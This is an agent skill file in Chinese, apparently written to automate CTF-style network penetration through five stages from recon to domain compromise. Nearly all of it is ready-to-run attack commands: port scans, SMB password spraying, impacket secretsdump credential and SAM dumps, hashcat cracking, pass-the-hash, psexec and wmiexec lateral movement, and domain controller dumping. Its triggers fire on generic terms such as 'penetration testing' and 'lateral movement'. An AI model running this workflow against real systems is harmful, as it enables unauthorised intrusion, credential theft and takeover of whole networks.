---
name: killchain
description: triggers: KILLCHAIN, 多阶段渗透, 渗透测试, 攻击链, 横向移动, 提权, 域渗透, AD攻击, kill chain, pivoting, lateral movement, privilege escalation
---

# KILLCHAIN 多阶段渗透 — CTF 自动化工作流

多阶段渗透：侦察 → 初始突破 → 提权 → 横向移动 → 持久化/目标达成。

## 工具清单

| 工具 | 安装 | 用途 |
|---|---|---|
| nmap | `scoop install nmap` | 端口/服务侦察 |
| masscan | `scoop install masscan` | 快速端口扫描 |
| impacket | `pip install impacket` | 横向移动（psexec/wmiexec/secretsdump） |
| crackmapexec | `pip install crackmapexec` | 网络批量利用 |
| bloodhound-python | `pip install bloodhound` | AD 攻击路径分析 |
| kerbrute | `go install` | Kerberos 枚举/爆破 |
| hashcat | `scoop install hashcat` | 密码破解 |
| chisel | 下载 release | 隧道/内网穿透 |

## 工作流：五阶段推进

### 阶段 1: 侦察 Recon

```bash
# 1a. 快速端口扫描
masscan -p1-65535 --rate=1000 <target_ip_range> -oJ /tmp/masscan.json
# 或 nmap 全端口
nmap -p- -T4 -oN /tmp/nmap_full.txt <target_ip>

# 1b. 服务版本识别
nmap -sV -sC -p <open_ports> -oN /tmp/nmap_services.txt <target_ip>

# 1c. SMB 枚举
crackmapexec smb <target_ip_range>
crackmapexec smb <target_ip> --shares -u '' -p ''

# 1d. 用户枚举（Kerberos）
kerbrute userenum -d <domain> --dc <dc_ip> <userlist.txt>
```

### 阶段 2: 初始突破 Initial Access

```bash
# 2a. 弱口令爆破
crackmapexec smb <target_ip> -u <userlist> -p <passlist>
crackmapexec winrm <target_ip> -u <user> -p <pass>

# 2b. 已知 CVE 利用（复用 exploit skill）
# searchsploit / metasploit 按服务版本搜

# 2c. 匿名访问
crackmapexec smb <target_ip> --shares -u '' -p ''
smbclient -N -L //<target_ip>
```

### 阶段 3: 信息收集与提权 Privesc

```bash
# 3a. 凭据 dump
python -m impacket.examples.secretsdump <domain>/<user>:<pass>@<target_ip>
# 本地 SAM dump
python -m impacket.examples.secretsdump -sam sam.save -system system.save LOCAL

# 3b. 提权枚举
# 如果有 shell，上传并运行：
# Linux: linpeas.sh
# Windows: winPEASx64.exe / PowerUp.ps1

# 3c. 密码破解
hashcat -m 1000 <ntlm_hash> <wordlist>  # NTLM
hashcat -m 5600 <netntlmv2> <wordlist>  # NetNTLMv2
```

### 阶段 4: 横向移动 Lateral

```bash
# 4a. BloodHound 分析（如果环境支持）
python -m bloodhound -d <domain> -u <user> -p <pass> -ns <dc_ip> -c All

# 4b. impacket 横向
python -m impacket.examples.psexec <domain>/<user>:<pass>@<target_ip>
python -m impacket.examples.wmiexec <domain>/<user>:<pass>@<target_ip>
python -m impacket.examples.atexec <domain>/<user>:<pass>@<target_ip> "command"

# 4c. Pass-the-Hash
python -m impacket.examples.psexec -hashes :<ntlm_hash> <domain>/<user>@<target_ip>

# 4d. crackmapexec 批量
crackmapexec smb <ip_range> -u <user> -H <ntlm_hash>
```

### 阶段 5: 目标达成 Objective

```bash
# 5a. 找 flag/敏感文件
# Windows: dir /s /b *flag* *secret* *password*
# Linux: find / -name "*flag*" -o -name "*secret*" 2>/dev/null

# 5b. 域控 dump
python -m impacket.examples.secretsdump <domain>/<admin>@<dc_ip>

# 5c. 证据收集
# 截图、输出重定向、记录 findings
```

## 命令模板速查

### 快速 SMB 攻击链

```bash
# 1. 枚举
crackmapexec smb <target_ip> --shares -u '' -p ''
# 2. 爆破
crackmapexec smb <target_ip> -u users.txt -p passwords.txt --continue-on-success
# 3. dump
python -m impacket.examples.secretsdump <domain>/<user>:<pass>@<target_ip>
# 4. 横向
python -m impacket.examples.psexec <domain>/<admin>:<pass>@<next_target>
```

### 无 impacket 回退

```bash
# 如果没装 impacket，用内置工具
# SMB: net use \\<ip>\share <pass> /u:<user>
# RDP: mstsc /v:<ip>
# WinRM: winrs -r:<ip> -u:<user> -p:<pass> cmd
```

## 判定规则

1. **匿名访问开放** → 立即可用，中危起步
2. **弱口令登录成功** → 直接突破，Critical
3. **凭据 dump 成功** → 可横向，High
4. **域控可达** → 最高优先级
5. **每个阶段都记录 findings**

## 输出

每个阶段：攻击向量、使用的工具/命令、获取的信息/权限、下一步方向。